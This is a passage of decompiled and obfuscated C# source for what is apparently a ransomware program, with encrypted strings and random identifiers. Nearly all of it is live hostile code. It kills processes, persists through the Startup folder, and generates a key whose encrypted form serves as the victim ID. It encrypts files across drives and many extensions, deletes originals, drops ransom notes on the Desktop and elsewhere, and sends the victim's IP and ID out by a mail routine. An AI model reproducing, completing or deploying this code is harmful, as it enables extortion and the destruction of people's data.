											File.AppendAllText(jnRLNtXuRRg, getString_0(107385604) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107385809) + ex11.Message + getString_0(107396257));
										}
										catch (Exception)
										{
										}
									}
									iePhSHBTqLd++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, CS_0024_003C_003E8__locals0.PUDDzPYRoE);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!EcdpqbMrQOzfdgL)
						{
							if (!IooTTsvIiwCN)
							{
								ruDoXmaKIFHJl(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107385850), lrVhqMPbYlaOK);
							}
							else
							{
								ruDoXmaKIFHJl(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107385850), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!IooTTsvIiwCN)
								{
									NjEZcsaMnUwQ(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, lrVhqMPbYlaOK);
								}
								else
								{
									NjEZcsaMnUwQ(CS_0024_003C_003E8__locals0.PUDDzPYRoE, CS_0024_003C_003E8__locals0.PUDDzPYRoE, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex14)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, getString_0(107385604) + CS_0024_003C_003E8__locals0.PUDDzPYRoE + getString_0(107385809) + ex14.Message + getString_0(107396257));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								return;
							}
						}
						if (IooTTsvIiwCN)
						{
							if (ZDxRrpKTbd != getString_0(107385855))
							{
								ixTFoaDRJMY(CS_0024_003C_003E8__locals0.PUDDzPYRoE + ZDxRrpKTbd, bytes2);
							}
							else
							{
								ixTFoaDRJMY(CS_0024_003C_003E8__locals0.PUDDzPYRoE, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac1;
			IL_0ac1:
			WNvdcTPDgW.Remove(CS_0024_003C_003E8__locals0.PUDDzPYRoE);
		}

		static YUIjdATTEVIX()
		{
			Strings.CreateGetStringDelegate(typeof(YUIjdATTEVIX));
		}
	}

	private sealed class FCrYAtqwyDP
	{
		public string atoCyWSfKSy;

		public string fRxskrnPHhc;

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					File.Delete(atoCyWSfKSy);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__46()
		{
			while (true)
			{
				try
				{
					if (File.Exists(fRxskrnPHhc))
					{
						File.Delete(fRxskrnPHhc);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string tTTuIqIyTVsKt;

	public static byte[] lrVhqMPbYlaOK;

	public static string kvJFoDYMuC;

	public static string cJvZgRMCiiT;

	public static List<string> HoHveMjVjvX;

	public static List<string> YtNGHYTThvg;

	public static string YsJopGaPpPETyH;

	public static string nyAmnOdcSzzfJ;

	public static string AFNtNBdAhEf;

	public static string zcPzHRZXYSoC;

	public static int PNgOzFQmoBxwkpD;

	public static string cySCSfjuDKIn;

	public static string mfIGHgxpUFhf;

	public static string vCBJiLpGmJSnD;

	public static string ARhmLIZgWToPak;

	public static string HUAsnTLTOzrk;

	public static string TaRSuIXzPFDe;

	public static string EBwCzzKShZJF;

	public static string xRKOGhAaTewo;

	public static List<string> vooFhNgKVZyUs;

	public static List<string> SlSeSNfJnzNh;

	public static string gqVCQVtJiavX;

	public static string oLgSSCEqAmbBry;

	public static string zSIqMRAKpkZZcGjv;

	public static List<string> yGkMwQPqUdXIj;

	public static string MSHRwSPpwmqxM;

	private static string FAZqQTFurwccxTs;

	public static string iEHeKlEPYHGI;

	public static string xYvGfyjIeZ;

	public static List<string> ZSNcfBFfJEfqQ;

	public static List<string> iSGwXCiIfXBR;

	public static List<string> jFoYvbvoLRCagvDFmn;

	public static List<string> BSHtnNKwjXivMJS;

	public static string AbUTAcXZWDez;

	public static List<string> hkXnlfpoGpnf;

	public static List<string> gNbydKfEzpWjv;

	public static string apDKFRuernzH;

	public static string rmnvFBReavI;

	internal static DateTime mfBqYHSOySd;

	internal static DateTime mvolkwWivlBcrm;

	public static string CdQMIPJOkrOUDSy;

	public static string xYkYbBCyjIxz;

	public static string eIevaseXuHQaH;

	public static string bdIGvvMoxCbM;

	public static string TuoGtjjIwGaoMFyS;

	public static string ofNBDRGhqfTF;

	public static string kdEfNQYswVmDU;

	public static string bxhZXFvKXZl;

	public static List<string> EKjYgfCTgvyfhvOPx;

	public static string vEWBFQaTPDgk;

	public static string PyFcFDpqJkSW;

	public static string MIRuXWVFFoLwtz;

	public static string VsxmPTvejQSFs;

	public static string ZxaKxHsjfdsdTvNKy;

	public static string KtQjokjXHZXUlt;

	public static string nvUGpJjfEl;

	public static string esDOwQNWzCks;

	public static string RzJDQuVkTCTlk;

	public static string vKUIQhdzgPHwb;

	public static string GfViqMwSHVEX;

	public static string IUCNbNITnGCo;

	public static string sQphlXbTpcR;

	public static string ltuxRtIPjttT;

	public static string aDFaQrSzgBxEj;

	public static string nLNEEVaUjoQklOdfI;

	public static string anwdjQbJZQFrk;

	public static string PxoomWcCvZubT;

	public static string NRDQBoJkcw;

	public static string LIbWxYpDOmPy;

	public static string rHeEvpAbjCjyvEaC;

	public static string NfiNMrNQVxA;

	public static string JOmKsEZdamZ;

	public static string befQPNWerVGdKp;

	public static string aEpEnRRNDPnpp;

	public static string QArBXOfqRoEA;

	public static string QGAYpwMzxm;

	public static string cbYwmSYgAK;

	public static string tMTGisYcNMVHo;

	public static string[] tPINiNFcqTnZtQ;

	public static string POXokwFKrkkHxdVH;

	public static bool VGKELVlTFUV;

	public static string ZHbEFyHPlfyw;

	public static bool IooTTsvIiwCN;

	public static bool fOGrPeGaBiaPoAHL;

	public static bool MVhCfgBRSEUkeJ;

	public static bool NBgAYvhpqTo;

	public static string jnRLNtXuRRg;

	public static bool joesCNAxeHUI;

	public static bool XqTYpFCObzAK;

	public static bool WmBMdIXNbOD;

	public static bool upflSQRmeWP;

	public static bool EcdpqbMrQOzfdgL;

	public static string diaHTfOFnw;

	public static bool qoRjYABduZF;

	public static Stopwatch uYmJJOwnKLBSZO;

	public static int iePhSHBTqLd;

	public static int XnicJWCgBOO;

	public static bool MiZHZrKmtKkaPXn;

	public static string RBZnAGRnuwHeRmi;

	public static string[] sohDoFMGJgbq;

	public static List<string> HXQxyzlRKB;

	public static int rHOZvgFGaXKMdexR;

	public static List<string> ttBolWBjlrOWveAHe;

	public static List<string> iMRzWeevHnmPma;

	public static List<string> isoUHjZdYowniZ;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1e;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			dkdfdmXmxAk CS_0024_003C_003E8__locals0 = new dkdfdmXmxAk();
			CS_0024_003C_003E8__locals0.sZxLlvESUzLZXKq = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.sZxLlvESUzLZXKq) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			GgTvqcqAxHuen.BeFWKOFLhEUG(FAZqQTFurwccxTs);
		}
		catch (Exception)
		{
		}
		try
		{
			if (QArBXOfqRoEA == getString_0(107396836))
			{
				Thread thread = new Thread(KyxsbLOnuzlNq.oIigrPUcEDCaa);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (vCBJiLpGmJSnD == getString_0(107396836))
		{
			Thread.Sleep(int.Parse(ARhmLIZgWToPak));
		}
		if (MIRuXWVFFoLwtz == getString_0(107396836))
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					OjfhzFWYFdyA CS_0024_003C_003E8__locals1 = new OjfhzFWYFdyA();
					CS_0024_003C_003E8__locals1.JNtjaLfncUVSAvQ = new string[4]
					{
						PhXjLAIdTCy(getString_0(107396799)),
						PhXjLAIdTCy(getString_0(107396814)),
						PhXjLAIdTCy(getString_0(107396765)),
						PhXjLAIdTCy(getString_0(107396736))
					};
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						YAxWDMRBAqs.uxfwPrDKmXAM(CS_0024_003C_003E8__locals1.JNtjaLfncUVSAvQ);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				YyobkwWMYCQnnj.cMdxgGQPavJww(PhXjLAIdTCy(getString_0(107396814)));
			}
			catch
			{
			}
			try
			{
				YyobkwWMYCQnnj.cMdxgGQPavJww(PhXjLAIdTCy(getString_0(107396736)));
			}
			catch
			{
			}
			try
			{
				YyobkwWMYCQnnj.cMdxgGQPavJww(PhXjLAIdTCy(getString_0(107396751)));
			}
			catch
			{
			}
			try
			{
				YyobkwWMYCQnnj.cMdxgGQPavJww(PhXjLAIdTCy(getString_0(107396765)));
			}
			catch
			{
			}
			Thread thread3 = new Thread(YAxWDMRBAqs.mPoSoGlmRRDOttyG);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && kdEfNQYswVmDU == getString_0(107396836))
		{
			try
			{
				rAZRsijHJK(PhXjLAIdTCy(getString_0(107397214)));
			}
			catch
			{
			}
		}
		try
		{
			if (EBwCzzKShZJF == getString_0(107396836) && LVQIRUnBDUGU.EkJQsDCjEYX())
			{
				new IWmRGYyQfUix().BBMgezuaVk(bool_0: false);
				LVQIRUnBDUGU.tIVUoAnjSvm();
			}
		}
		catch (Exception)
		{
		}
		if (oLgSSCEqAmbBry == getString_0(107396836) && LVQIRUnBDUGU.EkJQsDCjEYX())
		{
			new IWmRGYyQfUix().BBMgezuaVk(bool_0: false);
			new IWmRGYyQfUix().BhIQXAgdwzUYzv();
		}
		if (mfIGHgxpUFhf == getString_0(107396836))
		{
			AfmFjbRZgUZI.ooFwCRJKaT();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397109);
			string text2 = text + Path.GetFileName(fileName);
			if (zcPzHRZXYSoC == getString_0(107396836) && fileName != text2)
			{
				Thread thread4 = new Thread(vOgXjOChAtCE);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (YsJopGaPpPETyH == getString_0(107396836) && mainModule != null && fileName != text2)
			{
				try
				{
					PNgOzFQmoBxwkpD = SPEiVHsdqMrOfr(0, vooFhNgKVZyUs.Count);
					File.Copy(fileName, text + vooFhNgKVZyUs[PNgOzFQmoBxwkpD], overwrite: true);
					Process.Start(text + vooFhNgKVZyUs[PNgOzFQmoBxwkpD]);
					uheBeCJUIksTneW();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (apDKFRuernzH == getString_0(107396836) && DateTime.Now < mfBqYHSOySd)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (rmnvFBReavI == getString_0(107396836) && DateTime.Now > mvolkwWivlBcrm)
			{
				uheBeCJUIksTneW();
			}
		}
		catch
		{
		}
		KGVTKVBgGWup();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> source = iSGwXCiIfXBR;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385768)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				List<string> source2 = jFoYvbvoLRCagvDFmn;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385723)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				if (tMTGisYcNMVHo == getString_0(107396836))
				{
					string[] source3 = tPINiNFcqTnZtQ;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385723)), getString_0(107385730) + string_0 + getString_0(107385177));
						};
					}
					Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				if (!ProlBhJTlUdn().Contains(getString_0(107385962)))
				{
					WbYRPqkvADfNl(AbUTAcXZWDez);
				}
				else
				{
					List<string> bSHtnNKwjXivMJS = BSHtnNKwjXivMJS;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
						{
							tLMiMedPBjRN(PhXjLAIdTCy(XvbRsShmdArZzku(getString_0(107385172))), string_0);
						};
					}
					Parallel.ForEach(bSHtnNKwjXivMJS, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				}
				List<string> source4 = hkXnlfpoGpnf;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						tLMiMedPBjRN(PhXjLAIdTCy(getString_0(107385147)), string_0);
					};
				}
				Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread5 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397136))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397136)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107397087)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !HoHveMjVjvX.Contains(text6) && text6 != getString_0(107397098) && text6 != getString_0(107397045) && text6 != getString_0(107397024))
								{
									HoHveMjVjvX.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107397027)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107396982))
						{
							sQphlXbTpcR = getString_0(107396836);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107397005))
						{
							sQphlXbTpcR = getString_0(107396996);
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, getString_0(107396447) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (sQphlXbTpcR == getString_0(107396996))
		{
			uGjBrdWVRIU();
		}
		if (sQphlXbTpcR == getString_0(107396836))
		{
			try
			{
				uCRUdOISINB();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && MVhCfgBRSEUkeJ)
			{
				try
				{
					Thread thread6 = new Thread(CfZQmLVmhf.CjdJKMMyYtU);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			tLMiMedPBjRN(getString_0(107396402), PhXjLAIdTCy(getString_0(107396421)));
		}
		SecureString secureString = new SecureString();
		if (eIevaseXuHQaH == getString_0(107396996))
		{
			Random random = new Random();
			for (int k = 0; k < 32; k++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					k--;
				}
			}
		}
		else
		{
			nyAmnOdcSzzfJ = getString_0(107396316);
		}
		AFNtNBdAhEf = fFCYpdPapHY.lDIEEniZHqoT(iOetfsQkxCeX(secureString));
		if (WmBMdIXNbOD)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), diaHTfOFnw)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), diaHTfOFnw), string.Concat(PhXjLAIdTCy(getString_0(107396303)), new WebClient().DownloadString(PhXjLAIdTCy(getString_0(107396246))), getString_0(107396237), PhXjLAIdTCy(getString_0(107396232)), DateTime.Now, getString_0(107396237), PhXjLAIdTCy(getString_0(107396671)), AFNtNBdAhEf));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), diaHTfOFnw), getString_0(107396646) + AFNtNBdAhEf);
				}
			}
			catch (Exception ex9)
			{
				if (joesCNAxeHUI)
				{
					try
					{
						File.AppendAllText(jnRLNtXuRRg, getString_0(107396617) + ex9.Message + getString_0(107396237));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		BRISNrXaWNYPGsE.QNZIvLnWtWHkz(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), LIbWxYpDOmPy), cSgNnpdmLA(AFNtNBdAhEf), null, null, getString_0(107396536), getString_0(107396551), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			qbLGPZIjVGHs();
		}
		try
		{
			try
			{
				if (qoRjYABduZF)
				{
					Console.WriteLine(getString_0(107396502));
				}
			}
			catch
			{
			}
			ymlQPyHRYAlbpQK(new string[26]
			{
				getString_0(107396485),
				getString_0(107395936),
				getString_0(107395931),
				getString_0(107395926),
				getString_0(107395921),
				getString_0(107395948),
				getString_0(107395943),
				getString_0(107395938),
				getString_0(107395901),
				getString_0(107395896),
				getString_0(107395891),
				getString_0(107395918),
				getString_0(107395913),
				getString_0(107395908),
				getString_0(107395871),
				getString_0(107395866),
				getString_0(107395861),
				getString_0(107395888),
				getString_0(107395883),
				getString_0(107395878),
				getString_0(107395873),
				getString_0(107395836),
				getString_0(107395831),
				getString_0(107395826),
				getString_0(107395853),
				getString_0(107395848)
			}, new string[100]
			{
				getString_0(107395843),
				getString_0(107395806),
				getString_0(107395801),
				getString_0(107395824),
				getString_0(107395819),
				getString_0(107395814),
				getString_0(107395809),
				getString_0(107395772),
				getString_0(107395767),
				getString_0(107395762),
				getString_0(107395789),
				getString_0(107395784),
				getString_0(107395743),
				getString_0(107395738),
				getString_0(107395729),
				getString_0(107395756),
				getString_0(107395751),
				getString_0(107395746),
				getString_0(107395709),
				getString_0(107395704),
				getString_0(107395727),
				getString_0(107395722),
				getString_0(107395717),
				getString_0(107396192),
				getString_0(107396187),
				getString_0(107396182),
				getString_0(107396177),
				getString_0(107396204),
				getString_0(107396199),
				getString_0(107396194),
				getString_0(107396157),
				getString_0(107396152),
				getString_0(107396147),
				getString_0(107396174),
				getString_0(107396165),
				getString_0(107396128),
				getString_0(107396123),
				getString_0(107396118),
				getString_0(107395809),
				getString_0(107396113),
				getString_0(107395767),
				getString_0(107396136),
				getString_0(107396131),
				getString_0(107396094),
				getString_0(107396089),
				getString_0(107396084),
				getString_0(107396111),
				getString_0(107396106),
				getString_0(107396101),
				getString_0(107396064),
				getString_0(107396059),
				getString_0(107396054),
				getString_0(107396049),
				getString_0(107396076),
				getString_0(107396071),
				getString_0(107396066),
				getString_0(107396029),
				getString_0(107396024),
				getString_0(107396047),
				getString_0(107396042),
				getString_0(107396033),
				getString_0(107395988),
				getString_0(107396113),
				getString_0(107396007),
				getString_0(107395966),
				getString_0(107395957),
				getString_0(107395980),
				getString_0(107395971),
				getString_0(107395418),
				getString_0(107395413),
				getString_0(107395436),
				getString_0(107395427),
				getString_0(107395386),
				getString_0(107395381),
				getString_0(107395408),
				getString_0(107395403),
				getString_0(107395398),
				getString_0(107395393),
				getString_0(107395356),
				getString_0(107395347),
				getString_0(107395374),
				getString_0(107395369),
				getString_0(107395364),
				getString_0(107395327),
				getString_0(107395322),
				getString_0(107395313),
				getString_0(107395336),
				getString_0(107395331),
				getString_0(107396147),
				getString_0(107395294),
				getString_0(107395289),
				getString_0(107395284),
				getString_0(107395311),
				getString_0(107395306),
				getString_0(107395297),
				getString_0(107395260),
				getString_0(107395255),
				getString_0(107395278),
				getString_0(107395273),
				getString_0(107395268)
			}, new string[0], iOetfsQkxCeX(secureString), getString_0(107395231));
		}
		catch (Exception ex11)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, getString_0(107395218) + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395193)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395193));
				streamWriter.WriteLine(PhXjLAIdTCy(getString_0(107395672)));
				streamWriter.WriteLine(getString_0(107396237));
				streamWriter.WriteLine(PhXjLAIdTCy(getString_0(107392702)));
				streamWriter.WriteLine(AFNtNBdAhEf);
				if (iEHeKlEPYHGI == getString_0(107396996))
				{
					streamWriter.WriteLine(getString_0(107396237));
					streamWriter.WriteLine(PhXjLAIdTCy(getString_0(107392669)) + Convert.ToString(yGkMwQPqUdXIj.Count));
				}
				if (MiZHZrKmtKkaPXn)
				{
					streamWriter.WriteLine(getString_0(107396237));
					streamWriter.WriteLine(PhXjLAIdTCy(getString_0(107393136)));
					streamWriter.WriteLine(LRKYNOUdGHN.mJPfHItsLp());
				}
			}
			else
			{
				string text8 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395193));
				if (!text8.Contains(AFNtNBdAhEf) && !IooTTsvIiwCN)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395193), getString_0(107393103) + AFNtNBdAhEf);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in SlSeSNfJnzNh)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395193)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395193), item + getString_0(107395193), overwrite: true);
				}
				else
				{
					string text9 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395193));
					if (!text9.Contains(AFNtNBdAhEf) && !IooTTsvIiwCN)
					{
						File.AppendAllText(item + getString_0(107395193), getString_0(107393103) + AFNtNBdAhEf);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!NBgAYvhpqTo && num > 10)
			{
				break;
			}
		}
		if (JOmKsEZdamZ == getString_0(107396836))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393042)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393042));
					streamWriter2.WriteLine(PhXjLAIdTCy(getString_0(107393009)));
					streamWriter2.WriteLine(getString_0(107396237));
					streamWriter2.WriteLine(PhXjLAIdTCy(getString_0(107388767)));
					streamWriter2.WriteLine(AFNtNBdAhEf + PhXjLAIdTCy(getString_0(107388710)));
					if (iEHeKlEPYHGI == getString_0(107396996))
					{
						streamWriter2.WriteLine(getString_0(107396237));
						streamWriter2.WriteLine(PhXjLAIdTCy(getString_0(107388665)) + PhXjLAIdTCy(getString_0(107392669)) + Convert.ToString(yGkMwQPqUdXIj.Count) + PhXjLAIdTCy(getString_0(107388710)));
					}
					if (MiZHZrKmtKkaPXn)
					{
						streamWriter2.WriteLine(getString_0(107396237));
						streamWriter2.WriteLine(PhXjLAIdTCy(getString_0(107393136)));
						streamWriter2.WriteLine(LRKYNOUdGHN.mJPfHItsLp());
					}
				}
				else
				{
					string text10 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395193));
					if (!text10.Contains(AFNtNBdAhEf) && !IooTTsvIiwCN)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393042), PhXjLAIdTCy(getString_0(107388665)) + getString_0(107393103) + AFNtNBdAhEf + PhXjLAIdTCy(getString_0(107388710)));
					}
				}
			}
			catch
			{
			}
		}
		if (MSHRwSPpwmqxM == getString_0(107396836))
		{
			try
			{
				if (iEHeKlEPYHGI == getString_0(107396996))
				{
					LRKYNOUdGHN.SMzTIeNBFbvix(getString_0(107388604), getString_0(107388599), getString_0(107388618), string.Concat(PhXjLAIdTCy(getString_0(107396303)), new WebClient().DownloadString(PhXjLAIdTCy(getString_0(107396246))), getString_0(107388609), PhXjLAIdTCy(getString_0(107396232)), DateTime.Now, getString_0(107396237), PhXjLAIdTCy(getString_0(107388572)), Convert.ToString(yGkMwQPqUdXIj.Count), getString_0(107396237), PhXjLAIdTCy(getString_0(107396671)), AFNtNBdAhEf));
				}
				else
				{
					LRKYNOUdGHN.SMzTIeNBFbvix(getString_0(107388604), getString_0(107388599), getString_0(107388618), string.Concat(PhXjLAIdTCy(getString_0(107396303)), new WebClient().DownloadString(PhXjLAIdTCy(getString_0(107396246))), getString_0(107388609), PhXjLAIdTCy(getString_0(107396232)), DateTime.Now, getString_0(107396237), PhXjLAIdTCy(getString_0(107388572)), Convert.ToString(yGkMwQPqUdXIj.Count), getString_0(107396237), PhXjLAIdTCy(getString_0(107396671)), AFNtNBdAhEf));
				}
			}
			catch
			{
			}
		}
		if (xRKOGhAaTewo == getString_0(107396836))
		{
			try
			{
				USeGVLFbBAJva.JTPJhyLaRncs(new Uri(getString_0(107388555)));
			}
			catch
			{
			}
		}
		if (JOmKsEZdamZ == getString_0(107396996))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395193)))
				{
					Process.Start(PhXjLAIdTCy(getString_0(107388554)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395193));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393042)))
				{
					Process.Start(PhXjLAIdTCy(getString_0(107389009)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393042));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(KtQjokjXHZXUlt))
		{
			try
			{
				File.Delete(KtQjokjXHZXUlt);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397136))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397136)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(jnRLNtXuRRg, getString_0(107388992) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (joesCNAxeHUI)
		{
			try
			{
				File.AppendAllText(jnRLNtXuRRg, getString_0(107388947));
			}
			catch (Exception)
			{
			}
		}
		if (tTTuIqIyTVsKt == getString_0(107388966))
		{
			uheBeCJUIksTneW();
		}
	}

	public static void vOgXjOChAtCE()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(PhXjLAIdTCy(getString_0(107388925)), PhXjLAIdTCy(getString_0(107388803)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int SPEiVHsdqMrOfr(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> rLMXbmGnoPrqAy(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
